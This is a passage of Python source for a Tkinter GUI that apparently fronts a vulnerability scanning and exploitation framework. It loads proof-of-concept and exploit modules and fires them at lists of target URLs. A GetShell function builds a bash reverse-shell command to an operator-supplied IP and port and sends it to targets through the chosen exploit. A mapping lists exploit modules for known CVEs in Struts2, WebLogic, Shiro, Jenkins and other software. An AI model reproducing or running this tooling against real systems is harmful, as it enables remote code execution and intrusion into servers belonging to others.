        self.t.setDaemon(True)   # 守护--就算主界面关闭，线程也会留守后台运行（不对!）
        self.t.start()           # 启动

    def start(self):
        LoadEXP()
        self.CreateFrm()
        self.CreateFirst()
        self.CreateSecond()
        self.CreateThird()


class Mycheck:
    def __init__(self,root,frmCheck):
        self.frmCheck = frmCheck
        self.root = root
        self.columns = ("字段", "值")
        self.Type = ['User-Agent','Connection','Accept-Encoding','Accept']
        self.Value = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0','close','gzip, deflate','*/*']

    def CreateFrm(self):
        self.frmTOP = Frame(self.frmCheck, width=960, height=25,bg='whitesmoke')#

        self.frmleft_1 = Frame(self.frmCheck, width=480, height=55,bg='white')#
        self.frmleft_2 = Frame(self.frmCheck, width=480, height=250,bg='white')#
        self.frmleft_3 = Frame(self.frmCheck, width=480, height=255,bg='white')#

        self.frmright = Frame(self.frmCheck, width=480, height=565,bg='white')#

        self.frmTOP.grid(row=0, columnspan=2, padx=1, pady=1)
        self.frmleft_1.grid(row=1, column=0, padx=1, pady=1, sticky="w")
        self.frmleft_2.grid(row=2, column=0, padx=1, pady=1, sticky="w")
        self.frmleft_3.grid(row=3, column=0, padx=1, pady=1, sticky="w")
        self.frmright.grid(row=1, rowspan=3, column=1, padx=1, pady=1, sticky="e")

        self.frmTOP.grid_propagate(0)
        self.frmleft_1.grid_propagate(0)
        self.frmleft_2.grid_propagate(0)
        self.frmleft_3.grid_propagate(0)
        self.frmright.grid_propagate(0)

    def CreateFirst(self):
        self.checkbutton_1 = Button(self.frmTOP, text='发送', width=10, command=lambda :self.thread_it(self._request))
        self.checkbutton_2 = Button(self.frmTOP, text='生成EXP', width=10)

        self.checkbutton_1.grid(row=0, column=0, padx=1, pady=1)
        self.checkbutton_2.grid(row=0, column=1, padx=1, pady=1)

    def CreateSecond(self):
        self.label_1 = Label(self.frmleft_1, text="请求方法")
        self.comboxlist_1 = ttk.Combobox(self.frmleft_1,width='15',textvariable=comvalue_3,state='readonly')#请求方法类型
        self.comboxlist_1["values"] = tuple(Get_type)
        self.comboxlist_1.bind("<<ComboboxSelected>>", self.Action_post)

        self.label_2 = Label(self.frmleft_1, text="目标地址")
        self.EntA_1 = Entry(self.frmleft_1, width='58',highlightcolor='red', highlightthickness=1,textvariable=EntA_7_V,font=("consolas",10))#URL


        self.label_1.grid(row=0, column=0, padx=1, pady=1)
        self.comboxlist_1.grid(row=0, column=1, padx=1, pady=1, sticky='w')
        self.label_2.grid(row=1, column=0, padx=1, pady=1, sticky='s')
        self.EntA_1.grid(row=1, column=1, padx=1, pady=1, sticky='s')
    
    def CreateThird(self):
        self.frmleft_2_1 = Frame(self.frmleft_2, width=400, height=250,bg='whitesmoke')#
        self.frmleft_2_2 = Frame(self.frmleft_2, width=75, height=250,bg='whitesmoke')#

        self.frmleft_2_1.grid(row=0, column=0, padx=1, pady=1)
        self.frmleft_2_2.grid(row=0, column=1, padx=1, pady=1)

        self.frmleft_2_1.grid_propagate(0)
        self.frmleft_2_2.grid_propagate(0)


        self.treeview_1 = ttk.Treeview(self.frmleft_2_1, height=12, show="headings", columns=self.columns)  # 表格

        self.treeview_1.column("字段", width=100, anchor='w')#表示列,不显示
        self.treeview_1.column("值", width=300, anchor='w')
 
        self.treeview_1.heading("字段", text="字段")#显示表头
        self.treeview_1.heading("值", text="值")

        self.treeview_1.bind('<Double-Button-1>', self.set_cell_value) # 双击左键进入编辑

        self.checkbutton_3 = Button(self.frmleft_2_2, text='<-添加', width=9, command=self.newrow)
        self.checkbutton_4 = Button(self.frmleft_2_2, text='<-删除', width=9, command=self.deltreeview)
        self.checkbutton_5 = Button(self.frmleft_2_2, text='清空->', width=9, command=self.delText)

        self.treeview_1.grid(row=0, column=0, padx=1, pady=1)
        self.checkbutton_3.grid(row=0, column=0, padx=1, pady=1, sticky='n')
        self.checkbutton_4.grid(row=1, column=0, padx=1, pady=1, sticky='n')
        self.checkbutton_5.grid(row=2, column=0, padx=1, pady=1, sticky='n')

        for i in range(min(len(self.Type),len(self.Value))): # 写入数据
            self.treeview_1.insert('', i, values=(self.Type[i], self.Value[i]))

    def CreateFourth(self):
        self.Text_post = Text(self.frmleft_3, font=("consolas",10), width=65, height=17)
        self.Text_scr = Scrollbar(self.frmleft_3)

        self.Text_post.grid(row=0, column=0, padx=1, pady=1)
        self.Text_scr.grid(row=0, column=1, sticky=S + W + E + N)
        self.Text_scr.config(command=self.Text_post.yview)
        self.Text_post.config(yscrollcommand=self.Text_scr.set)

    def CreateFivth(self):
        self.Text_response = Text(self.frmright, font=("consolas",10), width=64, height=37)
        self.Text_response_scr = Scrollbar(self.frmright)

        self.Text_response.configure(state="disabled")
        self.Text_response.grid(row=0, column=0, padx=1, pady=1)
        self.Text_response_scr.grid(row=0, column=1, sticky=S + W + E + N)
        self.Text_response_scr.config(command=self.Text_response.yview)
        self.Text_response.config(yscrollcommand=self.Text_response_scr.set)

    def Action_post(self,*args):
        if comvalue_3.get() == 'POST':
            self.Type.append('Content-Type')
            self.Value.append('application/x-www-form-urlencoded')
            self.treeview_1.insert('', len(self.Type)-1, values=(self.Type[len(self.Type)-1], self.Value[len(self.Type)-1]))
            self.treeview_1.update()
        else:
            for index in self.treeview_1.get_children():
                #a = self.treeview_1.item(index, "values")
                if self.treeview_1.item(index, "values")[0] == 'Content-Type':
                    self.treeview_1.delete(index)

    def delText(self):
        self.Text_response.configure(state="normal")
        self.Text_response.delete('1.0','end')
        self.Text_response.configure(state="disabled")

    def newrow(self):
        self.Type.append('字段')
        self.Value.append('值')
    
        self.treeview_1.insert('', len(self.Type)-1, values=(self.Type[len(self.Type)-1], self.Value[len(self.Type)-1]))
        self.treeview_1.update()

    def deltreeview(self):
        for self.item in self.treeview_1.selection():
            self.treeview_1.delete(self.item)
            self.Type.pop(int(self.item.replace('I00',''))-1)
            self.Value.pop(int(self.item.replace('I00',''))-1)
    #双击编辑事件
    def set_cell_value(self,event):
        for self.item in self.treeview_1.selection():
        #item = I001
            item_text = self.treeview_1.item(self.item, "values")
	
        #print(item_text[0:2])  # 输出所选行的值
        self.column= self.treeview_1.identify_column(event.x)# 列
        row = self.treeview_1.identify_row(event.y)  # 行
        cn = int(str(self.column).replace('#',''))
        rn = int(str(row).replace('I',''))
        self.entryedit = Text(self.frmleft_2_1, font=("consolas",10))
        self.entryedit.insert(INSERT, item_text[cn-1])
        self.entryedit.bind('<FocusOut>',self.saveedit)
        self.entryedit.place(x=(cn-1)*self.treeview_1.column("字段")["width"],
                        y=25+(rn-1)*18,width=self.treeview_1.column(self.columns[cn-1])["width"],
                        height=18)
        
    #文本失去焦点事件
    def saveedit(self,event):
        try:
            self.treeview_1.set(self.item, column=self.column, value=self.entryedit.get(0.0, "end"))
            if self.column.replace('#','') == '1':
                self.Type[int(self.item.replace('I00',''))-1] = self.entryedit.get(0.0, "end").replace('\n','')
            elif self.column.replace('#','') == '2':
                self.Value[int(self.item.replace('I00',''))-1] = self.entryedit.get(0.0, "end").replace('\n','')

        except Exception as e:
            pass
        finally:
            self.entryedit.destroy()

    def handle_post(self,data_post):
        data_dic = {}
        for i in data_post.split('&'):
            j = i.split('=')
            data_dic.update({j[0]:j[1]})
        return data_dic

    def _request(self):
        self.headers = {}
        self.TIMEOUT = 5
        self.Action = comvalue_3.get()
        self.url = EntA_7_V.get()
        self.data_post = self.Text_post.get(1.0, "end").replace('\n','')
        if self.url:
            pass
        else:
            messagebox.showinfo(title='提示', message='请输入目标地址!')
            return

        for index in self.treeview_1.get_children():
            item_text = self.treeview_1.item(index, "values")

            self.headers.update({item_text[0].strip('\n'):item_text[1].strip('\n')})
        #print(globals())
        self.Text_response.configure(state="normal")
        try:
            if self.Action == 'GET':
                self.response = requests.get(url=self.url,
                                    headers=self.headers,
                                    timeout=self.TIMEOUT,
                                    verify=False)

            elif self.Action == 'POST':
                #POST数据处理
                if self.headers['Content-Type'] == 'application/x-www-form-urlencoded':
                    self.response = requests.post(url=self.url,
                                                headers=self.headers,
                                                data=self.handle_post(self.data_post),
                                                timeout=self.TIMEOUT,
                                                verify=False)
                    
                else:
                    self.response = requests.post(url=self.url,
                                                headers=self.headers,
                                                data=self.data_post,
                                                timeout=self.TIMEOUT,
                                                verify=False)
            else:
                messagebox.showinfo(title='提示', message='暂不支持该方法!')
                return
            self.rawdata = dump.dump_all(self.response,
                                        request_prefix=b'',
                                        response_prefix=b'').decode('utf-8','ignore')
            self.Text_response.delete('1.0','end')
            self.Text_response.insert(INSERT, self.rawdata)
        except requests.exceptions.Timeout as error:
            messagebox.showinfo(title='提示', message='请求超时!')
        except requests.exceptions.ConnectionError as error:
            messagebox.showinfo(title='提示', message='请求错误!')
        except KeyError as error:
            messagebox.showinfo(title='提示', message='POST请求需要加上 Content-Type 头部字段!')
        except Exception as error:
            messagebox.showinfo(title='提示', message=error)
        finally:
            self.Text_response.configure(state="disabled")
    
    def thread_it(self,func,**kwargs):
        self.t = threading.Thread(target=func,kwargs=kwargs)
        self.t.setDaemon(True)   # 守护--就算主界面关闭，线程也会留守后台运行（不对!）
        self.t.start()           # 启动


    def start(self):
        self.CreateFrm()
        self.CreateFirst()
        self.CreateSecond()
        self.CreateThird()
        self.CreateFourth()
        self.CreateFivth()

class Timed(object):
    def timed(self, de):
        now = datetime.datetime.now()
        time.sleep(de)
        color ("["+str(now)[11:19]+"] ",'cyan',end="")
    def timed_line(self, de):
        now = datetime.datetime.now()
        time.sleep(de)
        color ("["+str(now)[11:19]+"] ",'cyan',end="")
    def no_color_timed(self, de):
        now = datetime.datetime.now()
        time.sleep(de)
        print("["+str(now)[11:19]+"] ",end="")

class Colored(object):
    # Vuln type
    def rce(self):
        return "[rce]"
    def derce(self):
        return "[deserialization rce]"
    def upload(self):
        return "[upload]"
    def deupload(self):
        return "[deserialization upload]"
    def de(self):
        return "[deserialization]"
    def contains(self):
        return "[file contains]"
    def xxe(self):
        return "[xxe]"
    def sql(self):
        return "[sql]"
    def ssrf(self):
        return "[ssrf]"
    # Exploit Output
    #def exp_nc(self):
    #    return now.timed(de=0) + color.yeinfo() + color.yellow(" input \"nc\" bounce linux shell")
    #def exp_nc_bash(self):
    #    return now.timed(de=0) + color.yeinfo() + color.yellow(" nc shell: \"bash -i >&/dev/tcp/127.0.0.1/9999 0>&1\"")
    #def exp_upload(self):
    #    return now.timed(de=0) + color.yeinfo() + color.yellow(" input \"upload\" upload webshell")

class Verification(object):
    def show(self, request, pocname, method, rawdata, info):
        if VULN is not None:
            if DEBUG == "debug":
                print(rawdata)
                pass
            elif r"PoCWating" in request:
                now.timed(de=DELAY)
                color (" Command Executed Failed... ...", 'magenta')
            else:
                print (request)
            return None
        if CMD == "netstat -an" or CMD == "id" or CMD == "echo VuLnEcHoPoCSuCCeSS":
            now.timed(de=DELAY)
            color ("[+] The target is "+pocname+" ["+method+"] "+info, 'green')
        else:
            now.timed(de=DELAY)
            color ("[?] Can't judge "+pocname, 'yellow')
        if DEBUG=="debug":
            print (rawdata)
        if OUTPUT is not None:
            self.text_output(self.no_color_show_succes(pocname, info))
            
    def no_rce_show(self, request, pocname, method, rawdata, info):
        if VULN is not None:
            if r"PoCWating" in request:
                now.timed(de=DELAY)
                color (" Command Executed Successfully (No Echo)", 'yellow')
            else:
                print (request)
            return None
        if r"PoCSuSpEct" in request:#有嫌疑
            now.timed(de=DELAY)
            color ("[?] The target suspect " + pocname + " [" + method + "] " + info, 'yellow')
        elif r"PoCSuCCeSS" in request:#成功
            now.timed(de=DELAY)
            color ("[+] The target is "+pocname+" ["+method+"] "+info, 'green')
        #print (info)
        if DEBUG=="debug":
            print (rawdata)
        #if OUTPUT is not None:
        #    self.text_output(self.no_color_show_succes(pocname, info))
    def no_color_show_succes(self, pocname, info):
        return "--> "+pocname+" "+info
    def no_color_show_failed(self, pocname, info):
        return "--> "+pocname+" "+info
    def generic_output(self, request, pocname, method, rawdata, info):
        # Echo Error
        if r"echo VuLnEcHoPoCSuCCeSS" in request or r"echo%20VuLnEcHoPoCSuCCeSS" in request or r"echo%2520VuLnEcHoPoCSuCCeSS" in request or r"%65%63%68%6f%20%56%75%4c%6e%45%63%48%6f%50%6f%43%53%75%43%43%65%53%53" in request:
            now.timed(de=DELAY)
            color ("[-] The target no "+pocname+"                    \r", 'magenta')
        elif r"VuLnEcHoPoCSuCCeSS" in request:
            self.show(request, pocname, method, rawdata, info)
        # Linux host ====================================================================
        #elif r"uid=" in request:
        #    info = info+color.green(" [os:linux]")
        #    self.show(request, pocname, method, rawdata, info)
        #elif r"Active Internet connections" in request or r"command not found" in request:
        #    info = info+color.green(" [os:linux]")
        #    self.show(request, pocname, method, rawdata, info)
        # Windows host ==================================================================
        #elif r"Active Connections" in request  or r"活动连接" in request:
        #    info = info+color.green(" [os:windows]")
        #    self.show(request, pocname, method, rawdata, info)
        # Public :-)
        elif r":-)" in request:
            self.no_rce_show(request, pocname, method, rawdata, info)
        # Apache Tomcat: verification CVE-2020-1938
        elif r"Welcome to Tomcat" in request and r"You may obtain a copy of the License at" in request:
            self.no_rce_show(request, pocname, method, rawdata, info)
        # Struts2-045 "233x233"
            self.show(request, pocname, method, rawdata, info)
        # Public: "PoCSuSpEct" in request
        elif r"PoCSuSpEct" in request:
            self.no_rce_show(request, pocname, method, rawdata, info)
        # Public: "PoCSuCCeSS" in request
        elif r"PoCSuCCeSS" in request:
            self.no_rce_show(request, pocname, method, rawdata, info)
        # Public: "PoCWating" in request ,Failed
        elif r"PoCWating" in request:
            now.timed(de=DELAY)
            color ("[-] The target no "+pocname+"                    \r", 'magenta')
        # Public: "netstat -an" command check
        elif r"NC-Succes" in request:
            now.timed(de=DELAY)
            color (" The reverse shell succeeded. Please check", 'green')
        elif r"NC-Failed" in request:
            now.timed(de=DELAY)
            color (" The reverse shell failed. Please check", 'magenta')
        else:
            #print (now.timed(de=DELAY)+color.magenta("[-] The target no "+pocname))
            if VULN is not None:
                if DEBUG == "debug":
                    print(rawdata)
                    pass
                elif r"PoCWating" in request:
                    now.timed(de=DELAY)
                    color (" Command Executed Failed... ...", 'magenta')
                else:
                    print (request)
                return None
            if CMD == "netstat -an" or CMD == "id" or CMD == "echo VuLnEcHoPoCSuCCeSS":
                now.timed(de=DELAY)
                color ("[-] The target no "+pocname+"                    \r", 'magenta')
            else:
                now.timed(de=DELAY)
                color ("[?] Can't judge "+pocname, 'yellow')
            if DEBUG=="debug":
                print (rawdata)

    def timeout_output(self, pocname):
        now.timed(de=DELAY)
        color (" "+pocname+" check failed because timeout !!!", 'cyan')

    def connection_output(self, pocname):
        now.timed(de=DELAY)
        color (" "+pocname+" check failed because unable to connect !!!", 'cyan')

    def text_output(self, item):
        with open(OUTPUT, 'a') as output_file:
            output_file.write("%s\n" % item)


class Job(threading.Thread):
    def __init__(self, *args, **kwargs):
        super(Job, self).__init__(*args, **kwargs)
        self.__flag = threading.Event()   # 用于暂停线程的标识
        self.__flag.set()    # 设置为True
        self.__running = threading.Event()   # 用于停止线程的标识
        self.__running.set()   # 将running设置为True
    def run(self):
        while self.__running.isSet():
            self.__flag.wait()   # 为True时立即返回, 为False时阻塞直到内部的标识位为True后返回
            wait_running()
    def pause(self):
        self.__flag.clear()   # 设置为False, 让线程阻塞
    def resume(self):
        self.__flag.set()  # 设置为True, 让线程停止阻塞
    def stop(self):
        self.__flag.set()    # 将线程从暂停状态恢复, 如何已经暂停的话
        self.__running.clear()    # 设置为False


###全局函数定义###
#调用checkbutton按钮
def callCheckbutton(x,i):
    global scripts
    global vuln
    global Checkbutton_text
    global var
    #print(var)
    if var[i].get() == 1:
        try:
            for index in range(len(var)):
                if index != i:
                    var[index].set(0)
            vuln = importlib.import_module('.%s'%x,package='POC')
            Checkbutton_text = x
            print('[*] %s 模块已准备就绪!'%x)
        except Exception as e:
            print('[*]异常对象的内容是:%s'%e)
    else:
        vuln = None
        print('[*] %s 模块已取消!'%x)

#创建button
def Create(frm, x, i):
    global row
    global var

    threadLock.acquire()
    if int(row) > 18:
        row = 1
    button = Checkbutton(frm,text=x,command=lambda:callCheckbutton(x,i),variable=var[i])
    button.grid(row=row,sticky=W)
    print(x+'加载成功!')
    row += 1
    threadLock.release()

#填充线程列表
def CreateThread():
    temp_list = []
    for i in range(1,len(scripts)+1):
        temp_list.append(str(math.ceil(i/18)))
    temp_dict = dict(zip(scripts,temp_list))

    for i in range(len(scripts)):
        #scripts_name = scripts[i]
        thread = threading.Thread(target=Create,
        args=(gui.frms['frmD_'+ temp_dict[scripts[i]]],
        scripts[i], i))

        thread.setDaemon(True)
        threadList.append(thread)

#加载POC文件夹下的POC
def LoadPoc():
    global scripts
    global var

    try:
        for _ in glob.glob('POC/*.py'):
            script_name = os.path.basename(_).replace('.py', '')
            scripts.append(script_name)
            m = IntVar()
            var.append(m)
        CreateThread()

        for t in threadList:
            t.start()
    except Exception as e:
        tkinter.messagebox.showinfo('提示','请勿重复加载')

#加载EXP文件夹下的EXP
def LoadEXP():
    global exp_scripts,comvalue_1

    for _ in glob.glob('EXP/*.py'):
        script_name = os.path.basename(_).replace('.py', '')
        exp_scripts.append(script_name)
    exp_scripts.remove('__init__')
    #print(tuple(exp_scripts))

def bind_combobox(*args):
    #self.comboxlist_3.get()
    global vuln_1,exp_scripts_cve
    try:
        exp_scripts_cve = ['ALL']
        x = exp.comboxlist_3.get()
        exp_scripts_cve = exp_scripts_cve + VUL_EXP[x]
        exp.comboxlist_3_1["values"] = tuple(exp_scripts_cve)#设置具体的CVE漏洞
        vuln_1 = importlib.import_module('.%s'%x,package='EXP')
        print('[*]%s模块已准备就绪!'%x)
    except KeyError:
        exp.comboxlist_3_1["values"] = tuple(exp_scripts_cve)#设置具体的CVE漏洞
        vuln_1 = importlib.import_module('.%s'%x,package='EXP')
        print('[*]%s模块已准备就绪!'%x)
    except Exception as e:
        print('[*]异常对象的内容是:%s'%type(e))

def wait_running():
    global wait_index
    
    list = ["\\", "|", "/", "—"]
    index = wait_index % 4
    gui.TexCA.configure(state="normal")
    gui.TexCA.insert(INSERT,list[index])
    time.sleep(0.25)
    gui.TexCA.delete('1.0','end')
    gui.TexCA.configure(state="disabled")
    wait_index = wait_index + 1

def LoadCMD():
    global scriptPath
    start_directory = scriptPath +'/POC'
    os.startfile(start_directory)

#终止子线程
def _async_raise(tid, exctype):
    """raises the exception, performs cleanup if needed"""
    tid = ctypes.c_long(tid)
    if not inspect.isclass(exctype):
        exctype = type(exctype)
    res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exctype))
    if res == 0:
        raise ValueError("invalid thread id")
    elif res != 1:
        # """if it returns a number greater than one, you're in trouble,
        # and you should call it again with exc=NULL to revert the effect"""
        ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
        raise SystemError("PyThreadState_SetAsyncExc failed")

def Separator(str_):
    index = 91 - len(str_)
    left = math.ceil(index/2)
    right = math.floor(index/2)
    return '-'*left + str_ + '-'*right


#测试按钮功能
def BugTest(**kwargs):
#kwargs = {url,port,file_list,pool}
#url:str
#port:str
#file_list:str
#pool:str
    global vuln
    if vuln == None:
        messagebox.showinfo(title='提示', message='还未选择模块')
        return
    try:
        if 1 <= int(kwargs['pool']) <= 10:
            pass
        else:
            messagebox.showinfo(title='提示', message='线程数范围(1~10)')
            return
    except Exception as e:
        if type(e) == ValueError:
            messagebox.showinfo(title='提示', message='只能输入整数')
            return

    sc_name = vuln.__name__.replace('POC.','')
    #进度条初始化
    gui.p1["value"] = 0
    gui.root.update()
    #all_task = []
    file_list = kwargs['file_list'].split("\n")#获取分隔字符串列表
    file_list = [i for i in file_list if i!='']#去空处理
    #print(len(file_list))
    #print(kwargs)
    file_len = len(file_list)
    #进入批量测试功能
    if file_len > 0:
        start = time.time()
        flag = round(640/file_len, 2)#每执行一个任务增长的长度
        print(Separator(sc_name))
        #print(int(kwargs['pool']))
        executor = ThreadPoolExecutor(max_workers = int(kwargs['pool']))
        url_list = []#存储目标列表
        result_list = []#存储结果列表

        for url in file_list:
            args = {'url':url}
            url_list.append(args)
        try:
            for data in executor.map(lambda kwargs: vuln.check(**kwargs),url_list):
                if type(data) == list:#如果结果是列表,去重一次
                    data = list(set(data))
                result_list.append(data)#汇聚结果
                threadLock.acquire()
                gui.p1["value"] = gui.p1["value"]+flag#进度条
                #print(gui.p1["value"])
                gui.root.update()
                threadLock.release()
        except Exception as e:
            print('执行脚本出现错误: %s ,建议在脚本加上异常处理!'%type(e))
            gui.p1["value"] = 640
            gui.root.update()
        
        #print(result_list)
        index_list = [i+1 for i in range(len(url_list))]
        print_result = zip(index_list, file_list, result_list)#合并列表
        tb = pt.PrettyTable()
        tb.field_names = ["Index", "URL", "Result"]
        #tb.align['Index'] = 'l'
        tb.align['URL'] = 'l'
        tb.align['Result'] = 'l'
        for i in print_result:
            tb.add_row(i)
        print(tb)#输出结果
        end = time.time()
        print('[*]共花费时间：{} 秒'.format(seconds2hms(end - start)))
    #进入单模块测试功能
    elif kwargs['url']:
        start = time.time()
        try:
            wait_running_job = Job()
            wait_running_job.start()
            print(Separator(sc_name))
            vuln.check(**kwargs)
            wait_running_job.stop()
        except Exception as e:
            print('出现错误: %s'%type(e))
        end = time.time()
        print('[*]共花费时间：{} 秒'.format(seconds2hms(end - start)))
    #没有输入测试目标
    else:
        color('[*]请输入目标URL!','red')
        color('[*]请输入目标URL!','yellow')
        color('[*]请输入目标URL!','blue')
        color('[*]请输入目标URL!','green')
        color('[*]请输入目标URL!','orange')
        color('[*]请输入目标URL!','pink')
        color('[*]请输入目标URL!','cyan')


def ShowPython():
    print(str(sys.path))

def ReLoad():
    global vuln
    try:
        vuln = importlib.reload(vuln)
        print('[*]加载成功!')
    except Exception as e:
        messagebox.showinfo(title='提示', message='重新加载失败')
        return

def Check():
    gui.frmPOC.grid_remove()
    gui.frmEXP.grid_remove()
    gui.frmCheck.grid(row=1, column=0, padx=2, pady=2)


def EXP():
    gui.frmPOC.grid_remove()
    gui.frmCheck.grid_remove()
    gui.frmEXP.grid(row=1, column=0, padx=2, pady=2)
    sys.stdout = TextRedirector(exp.TexBOT_1_2, "stdout", index="2")
    sys.stderr = TextRedirector(exp.TexBOT_1_2, "stderr", index="2")

def POC():
    gui.frmEXP.grid_remove()
    gui.frmCheck.grid_remove()
    gui.frmPOC.grid()
    sys.stdout = TextRedirector(gui.TexB, "stdout")
    sys.stderr = TextRedirector(gui.TexB, "stderr")

def Area_POC(index):
    for i in range(1,5):
        gui.frms['frmD_'+str(i)].grid_remove()
    gui.frms['frmD_'+str(index)].grid(row=1, column=1, padx=2, pady=2)


def delText(text):
    text.configure(state="normal")
    text.delete('1.0','end')
    text.configure(state="disabled")


def GetShell(**kwargs):
    #print(kwargs)

    if kwargs['ip'] == ''or kwargs['port'] == '':
        print("[*]请输入反弹的IP和Port")
        return
    cmd = "bash -i >& /dev/tcp/"+ kwargs['ip'] + "/"+ kwargs['port']+ " 0>&1"
    kwargs['cmd'] = cmd
    exeCMD(**kwargs)


def exeCMD(**kwargs):
    global vuln_1,CMD
    if kwargs['url'] == '' or kwargs['cmd'] == '':
        color('[*]请输入目标URL和命令','pink')
        #print('[*]请输入目标URL和命令')
        return
    CMD = kwargs['cmd']
    start = time.time()
    try:
        print("[*]开始执行测试")
        vuln_1.check(**kwargs)
    except Exception as e:
        print('出现错误: %s'%e)
    end = time.time()
    print('[*]共花费时间：{} 秒'.format(seconds2hms(end - start)))
    #print(sys.modules)
def note():
    tkinter.messagebox.showinfo('提示','预留功能')


#退出时执行的函数
def callbackClose():
    if messagebox.askokcancel('提示','要执行此操作吗?') == True:
        save_data = str(exp.TexB1.get('0.0','end'))
        try:
            fobj_w = open('note.txt', 'w',encoding='utf-8')
            fobj_w.writelines(save_data)
            fobj_w.close()
            gui.root.destroy()
        except:
            gui.root.destroy()
def color(str, color='black', end='\n'):
    #自动添加\n换行符号,方便自动换行
    sys.stdout.Colored(str+'\n', color, end)
###全局函数定义###

###EXP运行环境配置###
VULN = True
DEBUG = None
DELAY = 0
TIMEOUT = 10
OUTPUT = None
CMD = "echo VuLnEcHoPoCSuCCeSS"
RUNALLPOC = False
###EXP运行环境配置###
###漏洞名称和具体的CVE对应###
VUL_EXP = {
    'ApacheActiveMQ': ['cve_2015_5254','cve_2016_3088'],
    'ApacheShiro': ['cve_2016_4437'],
    'ApacheSolr': ['cve_2017_12629','cve_2019_0193','cve_2019_17558'],
    'ApacheStruts2': ['s2_005', 's2_008', 's2_009', 's2_013', 's2_015', 's2_016', 's2_029', 's2_032', 's2_045', 's2_046', 's2_048', 's2_052', 's2_057', 's2_059', 's2_061', 's2_devMode'],
    'ApacheTomcat': ['tomcat_examples','cve_2017_12615','cve_2020_1938'],
    'ApacheUnomi': ['cve_2020_13942'],
    'Drupal': ['cve_2018_7600', 'cve_2018_7602', 'cve_2019_6340'],
    'Elasticsearch': ['cve_2014_3120','cve_2015_1427'],
    'Jenkins': ['cve_2017_1000353','cve_2018_1000861'],
    'Nexus': ['cve_2019_7238','cve_2020_10199'],
    'OracleWeblogic': ['cve_2014_4210', 'cve_2017_3506', 'cve_2017_10271', 'cve_2018_2894', 'cve_2019_2725', 'cve_2019_2729', 'cve_2020_2551', 'cve_2020_2555', 'cve_2020_2883', 'cve_2020_14882'],
    'RedHatJBoss': ['cve_2010_0738','cve_2010_1428','cve_2015_7501'],
    'ThinkPHP': ['cve_2018_20062','cve_2019_9082'],
    'Fastjson': ['cve_2017_18349_24','cve_2017_18349_47']
}
###漏洞名称和具体的CVE对应###

###默认的头部字段###
headers = {
    'Accept': 'application/x-shockwave-flash,'
              'image/gif,'
              'image/x-xbitmap,'
              'image/jpeg,'
              'image/pjpeg,'
              'application/vnd.ms-excel,'
              'application/vnd.ms-powerpoint,'
              'application/msword,'
              '*/*',
    'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
    'Content-Type':'application/x-www-form-urlencoded'
}
###默认的头部字段###

###环境变量###
PROXY_TYPE = {"SOCKS4":1,"SOCKS5":2,"HTTP":3}
threadLock = threading.Lock()#线程锁
scripts = []#lib下的脚本文件列表
exp_scripts = []#EXP下的脚本
exp_scripts_cve = ['ALL']#EXP下的脚本下的CVE编号
threadList = []#线程列表
var = []#变量列表
row = 1#动态创建button控件
path = ''#python第三方库路径
wait_index = 0#wait_running
Checkbutton_text = ''
now_text = ''
vuln = None#初始化调用flag
vuln_1 = None#初始化调用flag
verify = Verification()#标准输出
Colored_ = Colored()#颜色对象
now = Timed()#时间对象
github_now = None
Get_type = ['GET','POST']#请求类型
###环境变量###

###添加python环境的第三方库###
curPath = os.path.dirname(os.path.realpath(sys.executable))#当前执行路径
scriptPath = os.getcwd()
libPath = scriptPath+'/lib'
scriptLib = scriptPath+'/POC'
#追加搜索路径
sys.path.append(libPath)
sys.path.append(curPath)
sys.path.append(scriptPath)
sys.path.append(scriptLib)
###添加python环境的第三方库###
#内置函数
bifs = dir(__builtins__)
#关键字
kws = kwlist

if __name__ == "__main__":
    gui = MyGUI()

    #全局定义组件宽度
    s = ttk.Style()
    s.configure('Treeview', rowheight=18) # repace 40 with whatever you need

    ###定义组键初值###
    EntA_1_V = StringVar()#目标地址输入框
    EntA_2_V = StringVar()#Cookie输入框
    EntA_4_V = StringVar()#IP地址输入框
    EntA_5_V = StringVar()#Port输入框
    EntA_6_V = StringVar()#线程输入框
    EntA_7_V = StringVar()#第三模块URL输入框
    EntABOT_1_V = StringVar()#CMD命令输入框
    comvalue = StringVar()#代理类型输入框
    comvalue_1 = StringVar()#漏洞名称输入框
    comvalue_2 = StringVar()#调用方法
    comvalue_3 = StringVar()#请求方法类型
    CheckVar1 = IntVar()#控制代理开关1
    CheckVar2 = IntVar()#控制代理开关0
    ###设置初值###
    EntA_6_V.set('3')#初始化为3
    comvalue.set("SOCKS5")
    comvalue_1.set("请选择漏洞名称")
    comvalue_2.set("ALL")
    comvalue_3.set("GET")

    addr = StringVar(value='127.0.0.1')#代理IP
    port = StringVar(value='10086')#代理端口
    variable_dict = {"CheckVar1":CheckVar1, "CheckVar2":CheckVar2, "PROXY_TYPE":comvalue, "addr":addr, "port":port}#这里我们声明的变量全部应该写在主窗口生成后
    temp = socket.socket#去掉全局代理
    ###定义组键初值###
    
    gui.start()
    exp = MyEXP(gui.root,gui.frmEXP)
    mycheck = Mycheck(gui.root, gui.frmCheck)
    exp.start()
    mycheck.start()
    str1 = '''[*]请输入正确的网址,比如 [http://www.baidu.com]
[*]请注意有些需要使用域名, 有些需要使用IP!
[*]漏洞扫描模块是检测漏洞的, 命令执行需要在漏洞利用模块使用!
[-]有处BUG, 在读取py文件时, 如果引号前面有字母存在会出错, 如 f'', r''
'''
#输出重定向
    sys.stdout = TextRedirector(gui.TexB, "stdout")
    sys.stderr = TextRedirector(gui.TexB, "stderr")
    gui.TexB.insert(INSERT, str1)  #INSERT表示输入光标所在的位置，初始化后的输入光标默认在左上角
#自定义退出函数
    gui.root.protocol("WM_DELETE_WINDOW", callbackClose)
    gui.root.mainloop()